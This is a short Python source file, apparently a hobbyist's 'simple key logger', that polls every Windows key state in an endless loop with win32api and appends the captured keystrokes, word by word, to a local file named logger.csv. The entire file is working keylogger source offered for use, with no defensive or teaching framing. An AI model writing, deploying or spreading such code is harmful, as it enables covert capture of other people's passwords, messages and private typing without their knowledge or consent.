"""
Simple key logger saving input to csv file
Really simple version, so it saves input such as ctrl, shift etc.
Author: Kacy538 (ycaK)
"""

import csv
import time
import win32api

from VK_CODE import *

key = VK_CODES.VK_CODE
temp_world = []

while True:
    for x in key:
        if win32api.GetAsyncKeyState(key[x]):
            file = open('logger.csv', 'a')
            log = csv.writer(file, delimiter=' ', quotechar='|', quoting=csv.QUOTE_MINIMAL)
            if x != 'spacebar':
                temp_world += x
                time.sleep(0.098)
            else:
                log.writerow(''.join(temp_world))
                temp_world = []
                time.sleep(0.098)
                file.close()
